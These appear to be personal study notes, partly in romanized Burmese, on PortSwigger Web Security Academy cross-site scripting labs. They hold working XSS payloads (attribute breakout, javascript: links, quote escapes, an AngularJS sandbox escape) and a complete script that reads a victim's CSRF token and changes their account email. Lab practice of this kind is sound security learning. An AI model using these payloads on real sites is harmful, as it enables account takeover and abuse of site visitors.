
**** input box tway myar yin burp ko use

"onmouseover="alert(1)    => i use this payload cuz this site protect with ''  => everything i text is protect by ''

***
*** `javascript:alert(1)`         =>  my input value is at href tag  " "

![[Pasted image 20230109133126.png]]
	

-------------

`'-alert(1)-'`    => banned <script></script>

![[Pasted image 20230109141412.png]]

Banned <> character

![[Pasted image 20230109141533.png]]


--------------------------

Case => everything we put is cover with ''   and close with ''  / so we command like this

![[Pasted image 20230112135125.png]]


-----

Product id net tway det har

![[Pasted image 20230115170128.png]]

=> sotreid ka window.location net pay htar dal => dangerous

![[Pasted image 20230115170415.png]]

Al lo paw lar dal 

https://0a640027038353cdc0a4c2fb00eb009c.web-security-academy.net/product?productId=5&storeId=aaaa"><script>alert(1)</script>


---
=> App with Angula JS and found to use ng-app

![[Pasted image 20230115180336.png]]

 => Here is payload  for this problem `{{$on.constructor('alert(1)')()}}`

----
`\"-alert(1)}//`    => that's also good payload  to cover with ''

![[Pasted image 20230115183512.png]]


------

XSS to CSRF 

`<script> var req = new XMLHttpRequest(); req.onload = handleResponse; req.open('get','/my-account',true); req.send(); function handleResponse() { var token = this.responseText.match(/name="csrf" value="(\w+)"/)[1]; var changeReq = new XMLHttpRequest(); changeReq.open('post', '/my-account/change-email', true); changeReq.send('csrf='+token+'&email=test@test.com') }; </script>`

This above script will change email address for the person who was seen this comment  
email will change to test@test.com

------
